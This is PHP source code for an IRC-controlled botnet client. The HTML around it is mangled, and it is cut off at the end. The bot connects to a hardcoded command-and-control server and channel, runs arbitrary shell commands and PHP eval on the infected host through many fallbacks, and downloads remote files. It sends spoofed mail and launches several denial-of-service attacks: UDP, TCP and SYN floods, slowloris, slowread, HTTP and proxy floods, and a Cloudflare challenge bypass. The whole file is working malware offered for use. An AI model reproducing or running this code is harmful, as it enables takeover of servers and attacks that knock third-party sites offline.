<!--?php
$cfg = array(
    "server" =-->
<html><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252"></head><body>"41.185.94.172",

    "port" =&gt; "1337",
    "key" =&gt; "",
    "prefix" =&gt; "OZN-BoT-",
    "maxrand" =&gt; "9",
    "chan" =&gt; "#DauDinOzn",
    "trigger" =&gt; "",
    "hostauth" =&gt; "DauDinOznhost"
);
set_time_limit(0);
error_reporting(0);
$dir   = getcwd();
$uname = @php_uname();
function whereistmP() {
    $uploadtmp = ini_get('upload_tmp_dir');
    $uf        = getenv('USERPROFILE');
    $af        = getenv('ALLUSERSPROFILE');
    $se        = ini_get('session.save_path');
    $envtmp    = (getenv('TMP')) ? getenv('TMP') : getenv('TEMP');
    if(is_dir('/tmp') &amp;&amp; is_writable('/tmp'))

        return '/tmp';
    if(is_dir('/usr/tmp') &amp;&amp; is_writable('/usr/tmp'))

        return '/usr/tmp';
    if(is_dir('/var/tmp') &amp;&amp; is_writable('/var/tmp'))

        return '/var/tmp';
    if(is_dir($uf) &amp;&amp; is_writable($uf))

        return $uf;
    if(is_dir($af) &amp;&amp; is_writable($af))

        return $af;
    if(is_dir($se) &amp;&amp; is_writable($se))

        return $se;
    if(is_dir($uploadtmp) &amp;&amp; is_writable($uploadtmp))

        return $uploadtmp;
    if(is_dir($envtmp) &amp;&amp; is_writable($envtmp))

        return $envtmp;
    return '.';
}
function srvshelL($command) {
    $name = whereistmP() . "\\" . uniqid('NJ');
    $n    = uniqid('NJ');
    $cmd  = (empty($_SERVER['ComSpec'])) ? 
'd:\\windows\\system32\\cmd.exe' : $_SERVER['ComSpec'];
    win32_create_service(array(
        'service' =&gt; $n,
        'display' =&gt; $n,
        'path' =&gt; $cmd,
        'params' =&gt; "/c $command &gt;\"$name\""
    ));
    win32_start_service($n);
    win32_stop_service($n);
    win32_delete_service($n);
    while(!file_exists($name))
        sleep(1);
    $exec = file_get_contents($name);
    unlink($name);

    return $exec;
}
function ffishelL($command) {
    $name = whereistmP() . "\\" . uniqid('NJ');
    $api  = new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int 
SW);");
    $res  = $api-&gt;WinExec("cmd.exe /c $command &gt;\"$name\"", 0);
    while(!file_exists($name))
        sleep(1);
    $exec = file_get_contents($name);
    unlink($name);

    return $exec;
}
function comshelL($command, $ws) {
    $exec = $ws-&gt;exec("cmd.exe /c $command");
    $so   = $exec-&gt;StdOut();

    return $so-&gt;ReadAll();
}
function perlshelL($command) {
    $perl = new perl();
    ob_start();
    $perl-&gt;eval("system(\"$command\")");
    $exec = ob_get_contents();
    ob_end_clean();

    return $exec;
}
function Exe($command) {
    $exec  = $output = '';
    $dep[] = array(
        'pipe',
        'r'
    );
    $dep[] = array(
        'pipe',
        'w'
    );
    if (function_exists('passthru')) {
        ob_start();
        @passthru($command);
        $exec = ob_get_contents();
        ob_clean();
        ob_end_clean();
    } elseif (function_exists('system')) {
        $tmp = ob_get_contents();
        ob_clean();
        @system($command);
        $output = ob_get_contents();
        ob_clean();
        $exec = $tmp;
    } elseif (function_exists('exec')) {
        @exec($command, $output);
        $output = join("\n", $output);
        $exec   = $output;
    } elseif(function_exists('shell_exec'))
        $exec = @shell_exec($command);
    elseif (function_exists('popen')) {
        $output = @popen($command, 'r');
        while (!feof($output)) {
            $exec = fgets($output);
        }
        pclose($output);
    } elseif (function_exists('proc_open')) {
        $res = @proc_open($command, $dep, $pipes);
        while (!feof($pipes[1])) {
            $line = fgets($pipes[1]);
            $output .= $line;
        }
        $exec = $output;
        proc_close($res);
    } elseif(function_exists('win_shell_execute') &amp;&amp; 
strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
        $exec = winshelL($command);
    elseif(function_exists('win32_create_service') &amp;&amp; 
strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
        $exec = srvshelL($command);
    elseif(extension_loaded('ffi') &amp;&amp; strtoupper(substr(PHP_OS, 
0, 3)) === 'WIN')
        $exec = ffishelL($command);
    elseif(extension_loaded('perl'))
        $exec = perlshelL($command);

    return $exec;
}
class pBot {
    public $config = '';
    public $user_agents = array(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) 
AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 
Safari/534.16",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, 
like Gecko) Chrome/24.0.1312.60 Safari/537.17",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like 
Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 
Firefox/15.0a2",
        "Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20120403211507 
Firefox/12.0",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; 
Trident/6.0)",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0;
 GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)",
        "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 
Version/12.00"
    );
    public $charset = 
"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    public $users = array();
    public function start($cfg) {
        $this-&gt;config = $cfg;
        while (true) {
            if(!($this-&gt;conn = fsockopen($this-&gt;config['server'], 
$this-&gt;config['port'], $e, $s, 30)))
                $this-&gt;start($cfg);
            $ident = $this-&gt;config['prefix'];
            $alph  = range("0", "9");
            for($i = 0; $i &lt; $this-&gt;config['maxrand']; $i++)
                $ident .= $alph[rand(0, 9)];
            $this-&gt;send("USER " . $ident . " 127.0.0.1 localhost :" .
 php_uname() . "");
            $this-&gt;set_nick();
            $this-&gt;main();
        }
    }
    public function main() {
        while (!feof($this-&gt;conn)) {
            if (function_exists('stream_select')) {
                $read    = array(
                    $this-&gt;conn
                );
                $write   = NULL;
                $except  = NULL;
                $changed = stream_select($read, $write, $except, 30);
                if ($changed == 0) {
                    fwrite($this-&gt;conn, "PING :lelcomeatme\r\n");
                    $read    = array(
                        $this-&gt;conn
                    );
                    $write   = NULL;
                    $except  = NULL;
                    $changed = stream_select($read, $write, $except, 
30);
                    if($changed == 0)
                        break;
                }
            }
            $this-&gt;buf = trim(fgets($this-&gt;conn, 512));
            $cmd       = explode(" ", $this-&gt;buf);
            if (substr($this-&gt;buf, 0, 6) == "PING :") {
                $this-&gt;send("PONG :" . substr($this-&gt;buf, 6));
                continue;
            }
            if (isset($cmd[1]) &amp;&amp; $cmd[1] == "001") {
                $this-&gt;join($this-&gt;config['chan'], 
$this-&gt;config['key']);
                continue;
            }
            if (isset($cmd[1]) &amp;&amp; $cmd[1] == "433") {
                $this-&gt;set_nick();
                continue;
            }
            if ($this-&gt;buf != $old_buf) {
                $mcmd   = array();
                $msg    = substr(strstr($this-&gt;buf, " :"), 2);
                $msgcmd = explode(" ", $msg);
                $nick   = explode("!", $cmd[0]);
                $vhost  = explode("@", $nick[1]);
                $vhost  = $vhost[1];
                $nick   = substr($nick[0], 1);
                $host   = $cmd[0];
                if($msgcmd[0] == $this-&gt;nick)
                    for($i = 0; $i &lt; count($msgcmd); $i++)
                        $mcmd[$i] = $msgcmd[$i + 1];
                else
                    for($i = 0; $i &lt; count($msgcmd); $i++)
                        $mcmd[$i] = $msgcmd[$i];
                if (count($cmd) &gt; 2) {
                    switch ($cmd[1]) {
                        case "PRIVMSG":
                            if ($vhost == $this-&gt;config['hostauth'] 
|| $this-&gt;config['hostauth'] == "*") {
                                if (substr($mcmd[0], 0, 1) == ".") {
                                    switch (substr($mcmd[0], 1)) {
                                        case "mail":
                                            if (count($mcmd) &gt; 4) {
                                                $header = "From: &lt;" .
 $mcmd[2] . "&gt;";
                                                if (!mail($mcmd[1], 
$mcmd[3], strstr($msg, $mcmd[4]), $header)) {
                                                    
$this-&gt;privmsg($this-&gt;config['chan'], "[\2mail\2]: failed 
sending.");
                                                } else {
                                                    
$this-&gt;privmsg($this-&gt;config['chan'], "[\2mail\2]: sent.");
                                                }
                                            }
                                            break;
                                        case "dns":
                                            if (isset($mcmd[1])) {
                                                $ip = explode(".", 
$mcmd[1]);
                                                if (count($ip) == 4 
&amp;&amp; is_numeric($ip[0]) &amp;&amp; is_numeric($ip[1]) &amp;&amp; 
is_numeric($ip[2]) &amp;&amp; is_numeric($ip[3])) {
                                                    
$this-&gt;privmsg($this-&gt;config['chan'], "[\2dns\2]: " . $mcmd[1] . "
 =&gt; " . gethostbyaddr($mcmd[1]));
                                                } else {
                                                    
$this-&gt;privmsg($this-&gt;config['chan'], "[\2dns\2]: " . $mcmd[1] . "
 =&gt; " . gethostbyname($mcmd[1]));
                                                }
                                            }
                                            break;
                                        case "uname":
                                            if (@ini_get("safe_mode") or
 strtolower(@ini_get("safe_mode")) == "on") {
                                                $safemode = "on";
                                            } else {
                                                $safemode = "off";
                                            }
                                            $uname = php_uname();
                                            
$this-&gt;privmsg($this-&gt;config['chan'], "[\2info\2]: " . $uname . " 
(safe: " . $safemode . ")");
                                            break;
                                        case "rndnick":
                                            $this-&gt;set_nick();
                                            break;
                                        case "raw":
                                            $this-&gt;send(strstr($msg, 
$mcmd[1]));
                                            break;
                                        case "eval":
                                            ob_start();
                                            eval(strstr($msg, 
$mcmd[1]));
                                            $exec = ob_get_contents();
                                            ob_end_clean();
                                            $ret = explode("\n", $exec);
                                            for($i = 0; $i &lt; 
count($ret); $i++)
                                                if($ret[$i] != NULL)
                                                    
$this-&gt;privmsg($this-&gt;config['chan'], "      : " . 
trim($ret[$i]));
                                            break;
                                        case "exec":
                                            $command = 
substr(strstr($msg, $mcmd[0]), strlen($mcmd[0]) + 1);
                                            $exec    = exec($command);
                                            $ret     = explode("\n", 
$exec);
                                            for($i = 0; $i &lt; 
count($ret); $i++)
                                                if($ret[$i] != NULL)
                                                    
$this-&gt;privmsg($this-&gt;config['chan'], "      : " . 
trim($ret[$i]));
                                            break;
                                        case "cmd":
                                            $command = 
substr(strstr($msg, $mcmd[0]), strlen($mcmd[0]) + 1);
                                            $exec    = Exe($command);
                                            $ret     = explode("\n", 
$exec);
                                            for($i = 0; $i &lt; 
count($ret); $i++)
                                                if($ret[$i] != NULL)
                                                    
$this-&gt;privmsg($this-&gt;config['chan'], "      : " . 
trim($ret[$i]));
                                            break;
                                        case "ud.server":
                                            if (count($mcmd) &gt; 2) {
                                                
$this-&gt;config['server'] = $mcmd[1];
                                                $this-&gt;config['port']
   = $mcmd[2];
                                                if (isset($mcmcd[3])) {
                                                    
$this-&gt;config['pass'] = $mcmd[3];
                                                    
$this-&gt;privmsg($this-&gt;config['chan'], "[\2update\2]: info updated "
 . $mcmd[1] . ":" . $mcmd[2] . " pass: " . $mcmd[3]);
                                                } else {
                                                    
$this-&gt;privmsg($this-&gt;config['chan'], "[\2update\2]: switched 
server to " . $mcmd[1] . ":" . $mcmd[2]);
                                                }
                                                fclose($this-&gt;conn);
                                            }
                                            break;
                                        case "download":
                                            if (count($mcmd) &gt; 2) {
                                                if (!$fp = 
fopen($mcmd[2], "w")) {
                                                    
$this-&gt;privmsg($this-&gt;config['chan'], "[\2download\2]: could not 
open output file.");
                                                } else {
                                                    if (!$get = 
file($mcmd[1])) {
                                                        
$this-&gt;privmsg($this-&gt;config['chan'], "[\2download\2]: could not 
download \2" . $mcmd[1] . "\2");
                                                    } else {
                                                        for ($i = 0; $i 
&lt;= count($get); $i++) {
                                                            fwrite($fp, 
$get[$i]);
                                                        }
                                                        
$this-&gt;privmsg($this-&gt;config['chan'], "[\2download\2]: file \2" . 
$mcmd[1] . "\2 downloaded to \2" . $mcmd[2] . "\2");
                                                    }
                                                    fclose($fp);
                                                }
                                            } else {
                                                
$this-&gt;privmsg($this-&gt;config['chan'], "[\2download\2]: use 
.download http://your.host/file /tmp/file");
                                            }
                                            break;
                                        case "udpflood":
                                            if (count($mcmd) &gt; 4) {
                                                
$this-&gt;udpflood($mcmd[1], $mcmd[2], $mcmd[3], $mcmd[4]);
                                            }
                                            break;
                                        case "tcpconn":
                                            if (count($mcmd) &gt; 5) {
                                                
$this-&gt;tcpconn($mcmd[1], $mcmd[2], $mcmd[3]);
                                            }
                                            break;
                                        case "rudy":
                                            if (count($mcmd) &gt; 2) {
                                                
$this-&gt;doSlow($mcmd[1], $mcmd[2]);
                                            }
                                            break;
                                        case "slowread":
                                            if (count($mcmd) &gt; 3) {
                                                
$this-&gt;slowRead($mcmd[1], $mcmd[2], $mcmd[3]);
                                            }
                                            break;
                                        case "slowloris":
                                            if (count($mcmd) &gt; 2) {
                                                
$this-&gt;doSlow($mcmd[1], $mcmd[2]);
                                            }
                                            break;
                                        case "synflood":
                                            if (count($mcmd) &gt; 3) {
                                                
$this-&gt;synflood($mcmd[1], $mcmd[2], $mcmd[3]);
                                            }
                                        case "l7":
                                            if (count($mcmd) &gt; 3) {
                                                if ($mcmd[1] == "get") {
                                                    
$this-&gt;attack_http("GET", $mcmd[2], $mcmd[3]);
                                                }
                                                if ($mcmd[1] == "post") {
                                                    
$this-&gt;attack_post($mcmd[2], $mcmd[3]);
                                                }
                                                if ($mcmd[1] == "head") {
                                                    
$this-&gt;attack_http("HEAD", $mcmd[2], $mcmd[3]);
                                                }
                                            }
                                            break;
                                        case "syn":
                                            if (count($mcmd) &gt; 2) {
                                                $this-&gt;syn($mcmd[1], 
$mcmd[2], $mcmd[3], $mcmd[4]);
                                            } else {
                                                
$this-&gt;privmsg($this-&gt;config['chan'], "syntax: syn host port time 
[delaySeconds]");
                                            }
                                            break;
                                        case "tcpflood":
                                            if (count($mcmd) &gt; 2) {
                                                
$this-&gt;tcpflood($mcmd[1], $mcmd[2], $mcmd[3]);
                                            } else {
                                                
$this-&gt;privmsg($this-&gt;config['chan'], "syntax: tcpflood host port 
time");
                                            }
                                            break;
                                        case "httpflood":
                                            if (count($mcmd) &gt; 2) {
                                                
$this-&gt;httpflood($mcmd[1], $mcmd[2], $mcmd[3], $mcmd[4], $mcmd[5]);
                                            } else {
                                                
$this-&gt;privmsg($this-&gt;config['chan'], "syntax: httpflood host port
 time [method] [url]");
                                            }
                                            break;
                                        case "proxyhttpflood":
                                            if (count($mcmd) &gt; 2) {
                                                
$this-&gt;proxyhttpflood($mcmd[1], $mcmd[2], $mcmd[3], $mcmd[4]);
                                            } else {
                                                
$this-&gt;privmsg($this-&gt;config['chan'], "syntax: proxyhttpflood 
targetUrl(with http://) proxyListUrl time [method]");
                                            }
                                            break;
                                        case "cloudflareflood":
                                            print_r($mcmd);
                                            if (count($mcmd) &gt; 2) {
                                                
$this-&gt;cloudflareflood($mcmd[1], $mcmd[2], $mcmd[3], $mcmd[4], 
$mcmd[5], $mcmd[6]);
                                            } else {
                                                
$this-&gt;privmsg($this-&gt;config['chan'], "syntax: cloudflareflood 
host port time [method] [url] [postFields]");
                                            }
                                            break;
                                    }
                                }
                            }
                            break;
                    }
                }
            }
        }
    }
    public function send($msg) {
        fwrite($this-&gt;conn, $msg . "\r\n");
    }
    public function join($chan, $key = NULL) {
        $this-&gt;send("JOIN " . $chan . " " . $key);
    }
    public function privmsg($to, $msg) {
        $this-&gt;send("PRIVMSG " . $to . " :" . $msg);
    }
    public function notice($to, $msg) {
        $this-&gt;send("NOTICE " . $to . " :" . $msg);
    }
    public function set_nick() {
        $fp = fsockopen("freegeoip.net", 80, $dummy, $dummy, 30);
        if(!$fp)
            $this-&gt;nick = "[UKN]";
        else {
            fclose($fp);
            $ctx = stream_context_create(array(
                'http' =&gt; array(
                    'timeout' =&gt; 30
                )
            ));
            $buf = file_get_contents("http://freegeoip.net/json/", 0, 
$ctx);
            if(!strstr($buf, "country_code"))
                $this-&gt;nick = "[UKN]";
            else {
                $code       = strstr($buf, "country_code");
                $code       = substr($code, 12);
                $code       = substr($code, 3, 2);
                $this-&gt;nick = "[" . $code . "]";
            }
        }
        if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
            $this-&gt;nick .= "[WIN32]";
        else
            $this-&gt;nick .= "[LINUX]";
        if (isset($_SERVER['SERVER_SOFTWARE'])) {
            if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']), 
"apache"))
                $this-&gt;nick .= "[A]";
            elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']), 
"iis"))
                $this-&gt;nick .= "[I]";
            elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']), 
"xitami"))
                $this-&gt;nick .= "[X]";
            elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']), 
"nginx"))
                $this-&gt;nick .= "[N]";
            else
                $this-&gt;nick .= "[U]";
        } else {
            $this-&gt;nick .= "[C]";
        }
        $this-&gt;nick .= $this-&gt;config['prefix'];
        for($i = 0; $i &lt; $this-&gt;config['maxrand']; $i++)
            $this-&gt;nick .= mt_rand(0, 9);
        $this-&gt;send("NICK " . $this-&gt;nick);
    }
    public function cloudflareflood($host, $port, $time, $method="GET", 
$url="/", $post=array()) {
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2CloudFlareFlood 
Started!\2]");
        $timei    = time();
        $user_agent = $this-&gt;user_agents[rand(0, 
count($this-&gt;user_agents)-1)];
        $packet = "$method $url HTTP/1.1\r\n";
        $packet .= "Host: $host\r\n";
        $packet .= "Keep-Alive: 300\r\n";
        $packet .= "Connection: keep-alive\r\n";
        $packet .= "User-Agent: $user_agent\r\n";
        //Cloudflare Bypass
        $res =  curl($host, null, $user_agent, true);
        //Cloudflare Bypass
        if (strstr($res, "DDoS protection by CloudFlare")) {
            $this-&gt;privmsg($this-&gt;config['chan'], "[\2CloudFlare 
detected!...\2]");
            //Get the math calc
            $math_calc = get_between($res, "a.value = ", ";");
            if ($math_calc) {
                $math_result = (int) eval("return ($math_calc);");
                if (is_numeric($math_result)) {
                    $math_result += strlen($host); //Domain lenght
                    //Send the CloudFlare's form
                    $getData = "cdn-cgi/l/chk_jschl";
                    $getData .= "?jschl_vc=".get_between($res, 
'name="jschl_vc" value="', '"');
                    $getData .= "&amp;jschl_answer=".$math_result;
                    $res = curl($host.$getData, null, $user_agent);
                    //Cloudflare Bypassed?
                    if (strstr($res, "DDoS protection by CloudFlare")) {
                        $this-&gt;privmsg($this-&gt;config['chan'], 
"[\2CloudFlare not bypassed...\2]");

                        return false;
                    } else {
                        $bypassed = true;
                        //Cookie read
                        $cookie = 
trim(get_between(file_get_contents("cookie.txt"), "__cfduid", "\n"));
                        $packet .= "Cookie: 
__cfduid=".$cookie."\r\n\r\n";
                    }
                }
            }
        } else {
            $this-&gt;privmsg($this-&gt;config['chan'], "[\2CloudFlare 
not detected...\2]");
        }
        if ($bypassed) {
            $this-&gt;privmsg($this-&gt;config['chan'], "[\2CloudFlare 
bypassed!\2]");
        }
        $this-&gt;privmsg($this-&gt;config['chan'], 
"[\2Flodding...\2]");
        while (time() - $timei &lt; $time) {
            $handle = fsockopen($host, $port, $errno, $errstr, 1);
            fwrite($handle, $packet);
        }
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2Bitch Got 
Nulled!\2]");
    }
    public function httpflood($host, $port, $time, $method="GET", 
$url="/") {
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2HttpFlood 
Started!\2]");
        $timei    = time();
        $user_agent = $this-&gt;user_agents[rand(0, 
count($this-&gt;user_agents)-1)];
        $packet = "$method $url HTTP/1.1\r\n";
        $packet .= "Host: $host\r\n";
        $packet .= "Keep-Alive: 900\r\n";
        $packet .= "Cache-Control: no-cache\r\n";
        $packet .= "Content-Type: 
application/x-www-form-urlencoded\r\n";
        $packet .= "Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
        $packet .= "Accept-Language: en-GB,en-US;q=0.8,en;q=0.6\r\n";
        $packet .= "Accept-charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n";
        $packet .= "Connection: keep-alive\r\n";
        $packet .= "User-Agent: $user_agent\r\n\r\n";
        while (time() - $timei &lt; $time) {
            $handle = fsockopen($host, $port, $errno, $errstr, 1);
            fwrite($handle, $packet);
        }
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2HttpFlood 
Finished!\2]");
    }
    public function proxyhttpflood($url, $proxyListUrl, $time, 
$method="GET") {
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2ProxyHttpFlood 
Started!\2]");
        $timei    = time();
        //Grabbing proxy
        $proxyList = curl($proxyListUrl);
        if ($proxyList) {
            $proxies = explode("\n", $proxyList);
            if (count($proxies)) {
                shuffle($proxies);
                $proxies[0] = trim($proxies[0]);
                $proxy = explode(":", $proxies[0]);
                $proxyIp = $proxy[0];
                $proxyPort = $proxy[1];
                if ($proxyPort &amp;&amp; $proxyIp) {
                    $user_agent = $this-&gt;user_agents[rand(0, 
count($this-&gt;user_agents)-1)];
                    $packet = "$method $url  HTTP/1.1\r\n";
                    $packet .= "Host: $host\r\n";
                    $packet .= "Keep-Alive: 900\r\n";
                    $packet .= "Cache-Control: no-cache\r\n";
                    $packet .= "Content-Type: 
application/x-www-form-urlencoded\r\n";
                    $packet .= "Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
                    $packet .= "Accept-Language: 
en-GB,en-US;q=0.8,en;q=0.6\r\n";
                    $packet .= "Accept-charset: 
ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n";
                    $packet .= "Connection: keep-alive\r\n";
                    $packet .= "User-Agent: $user_agent\r\n\r\n";
                    while (time() - $timei &lt; $time) {
                        $handle = fsockopen($proxyIp, $proxyPort, 
$errno, $errstr, 1);
                        fwrite($handle, $packet);
                    }
                } else {
                    $this-&gt;privmsg($this-&gt;config['chan'], 
"[\2Malformed proxy!\2]");
                }
            } else {
                $this-&gt;privmsg($this-&gt;config['chan'], "[\2No 
proxies found!\2]");
            }
        } else {
            $this-&gt;privmsg($this-&gt;config['chan'], "[\2Proxy List 
not found!\2]");
        }
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2ProxyHttpFlood 
Finished (Proxy: ".$proxies[0].")!\2]");
    }
    public function tcpflood($host, $port, $time) {
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2TCP 
Started!\2]");
        $timei    = time();
        $packet = "";
        for ($i = 0; $i &lt; 65000; $i++) {
            $packet .= $this-&gt;charset[rand(0, 
strlen($this-&gt;charset))];
        }
        while (time() - $timei &lt; $time) {
            $handle = fsockopen("tcp://".$host, $port, $errno, $errstr, 
1);
            fwrite($handle, $packet);
        }
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2TCP 
Finished!\2]");
    }
    public function slowRead($host, $port, $time) {
        $timei = time();
        $fs    = array();
        //initialize get headers.
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2Started 
Slowread!\2]");
        $headers = "GET / HTTP/1.1\r\nHost: {$host}\r\nUser-Agent: 
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like 
Gecko) Chrome/31.0.1650.63 Safari/537.36\r\n\r\n";
        while (time() - $timei &lt; $time) {
            for ($i = 0; $i &lt; 100; $i++) {
                $fs[$i] = @fsockopen($host, $port, $errno, $errstr);
                fwrite($fs[$i], $headers);
            }
            while (time() - $timei &lt; $time) {
                for ($i = 0; $i &lt; count($fs); $i++) {
                    if (!$fs[$i]) {
                        $fs[$i] = @fsockopen($host, $port, $errno, 
$errstr);
                        fwrite($fs[$i], $headers);
                    }
                    fread($fs[$i], 1);
                }
                sleep(mt_rand(0.5, 2));
            }
        }
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2Finished 
Slowread\2]");
    }
    public function attack_http($mthd, $server, $time) {
        $timei = time();
        $fs    = array();
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2Layer 7 {$mthd} 
Attack Started On : $server!\2]");
        $request = "$mthd / HTTP/1.1\r\n";
        $request .= "Host: $server\r\n";
        $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; 
Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
        $request .= "Keep-Alive: 900\r\n";
        $request .= "Accept: *.*\r\n";
        $timei = time();
        for ($i = 0; $i &lt; 100; $i++) {
            $fs[$i] = @fsockopen($server, 80, $errno, $errstr);
        }
        while ((time() - $timei &lt; $time)) {
            for ($i = 0; $i &lt; 100; $i++) {
                if (@fwrite($fs[$i], $request)) {
                    continue;
                } else {
                    $fs[$i] = @fsockopen($server, 80, $errno, $errstr);
                }
            }
        }
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2Layer 7 {$mthd} 
Attack Finished!\2]");
    }
    public function attack_post($server, $host, $time) {
        $timei = time();
        $fs    = array();
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2Layer 7 Post 
Attack Started On : $server!\2]");
        $request = "POST /" . md5(rand()) . " HTTP/1.1\r\n";
        $request .= "Host: $host\r\n";
        $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; 
Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
        $request .= "Keep-Alive: 900\r\n";
        $request .= "Content-Length: 1000000000\r\n";
        $request .= "Content-Type: 
application/x-www-form-urlencoded\r\n";
        $request .= "Accept: *.*\r\n";
        for ($i = 0; $i &lt; 100; $i++) {
            $fs[$i] = @fsockopen($host, 80, $errno, $errstr);
        }
        while ((time() - $timei &lt; $time)) {
            for ($i = 0; $i &lt; 100; $i++) {
                if (@fwrite($fs[$i], $request)) {
                    continue;
                } else {
                    $fs[$i] = @fsockopen($host, 80, $errno, $errstr);
                }
            }
        }
        fclose($sockfd);
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2Layer 7 Post 
Attack Finished!\2]");
    }
    public function doSlow($host, $time) {
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2SlowLoris 
Started!\2]");
        $timei = time();
        $i     = 0;
        for ($i = 0; $i &lt; 100; $i++) {
            $fs[$i] = @fsockopen($host, 80, $errno, $errstr);
        }
        while ((time() - $timei &lt; $time)) {
            for ($i = 0; $i &lt; 100; $i++) {
                $out = "POST / HTTP/1.1\r\n";
                $out .= "Host: {$host}\r\n";
                $out .= "User-Agent: Opera/9.21 (Windows NT 5.1; U; 
en)\r\n";
                $out .= "Content-Length: " . rand(1, 1000) . "\r\n";
                $out .= "X-a: " . rand(1, 10000) . "\r\n";
                if (@fwrite($fs[$i], $out)) {
                    continue;
                } else {
                    $fs[$i] = @fsockopen($server, 80, $errno, $errstr);
                }
            }
        }
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2SlowLoris 
Finished!\2]");
    }
    public function syn($host, $port, $time, $delay=1) {
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2SYN 
Started!\2]");
        $timei    = time();
        $socks = array();
        while (time() - $timei &lt; $time) {
            $numsocks++;
            $socks[$numsocks] = @socket_create(AF_INET, SOCK_STREAM, 
SOL_TCP);
            if (!$socks[$numsocks]) continue;
            @socket_set_nonblock($socks[$numsocks]);
            for ($j = 0; $j &lt; 20; $j++)
                @socket_connect($socks[$numsocks], $host, $port);
            sleep($delay);
        }
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2SYN Finished 
(".$numsocks." socks created)!\2]");
    }
    public function synflood($host, $port, $delay) {
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2synFlood 
Started!\2]");
        $socks    = array();
        $numsocks = 0;
        $numsocks++;
        $socks[$numsocks] = socket_create(AF_INET, SOCK_STREAM, 
SOL_TCP);
        if(!$socks[$numsocks])
            continue;
        @socket_set_nonblock($socks[$numsocks]);
        for($j = 0; $j &lt; 20; $j++)
            @socket_connect($socks[$numsocks], $host, $port);
        sleep($delay);
        for ($j = 0; $j &lt; $numsocks; $j++) {
            if($socks[$j])
                @socket_close($socks[$j]);
        }
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2SynFlood 
Finished!\2]: Config - For $host:$port.");
    }
    public function udpflood($host, $port, $time, $packetsize) {
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2 &gt;&gt; Dam 
FLooD lu' $host pe port $port - timp $time cu $packetsize pachete \2]");
        $packet = "";
        for ($i = 0; $i &lt; $packetsize; $i++) {
            $packet .= chr(rand(1, 256));
        }
        $end = time() + $time;
        $i   = 0;
        $fp  = fsockopen("udp://" . $host, $port, $e, $s, 5);
        while (true) {
            fwrite($fp, $packet);
            fflush($fp);
            if ($i % 100 == 0) {
                if($end &lt; time())
                    break;
            }
            $i++;
        }
        fclose($fp);
        $env = $i * $packetsize;
        $env = $env / 1048576;
        $vel = $env / $time;
        $vel = round($vel);
        $env = round($env);
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2 [[#] DDoS 
attack finished ! [#]]: \2]: " . $env . " MB trimisi / Medie : " . $vel .
 " MB/s ");
    }
    public function tcpconn($host, $port, $time) {
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2TcpConn 
Started!\2]");
        $end = time() + $time;
        $i   = 0;
        while ($end &gt; time()) {
            $fp = fsockopen($host, $port, $dummy, $dummy, 1);
            fclose($fp);
            $i++;
        }
        $this-&gt;privmsg($this-&gt;config['chan'], "[\2TcpFlood 
Finished!\2]: sent " . $i . " connections to $host:$port.");
    }
}
$bot = new pBot;
$bot-&gt;start($cfg);

function curl($url, $post=array(), $user_agent="", $deleteCookies=false)
 {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
    if ($user_agent) {
        curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
    }
    if (!empty($post)) {
        curl_setopt($ch,CURLOPT_POST, 1);
        curl_setopt($ch,CURLOPT_POSTFIELDS, $post);
    }
    if ($deleteCookies) {
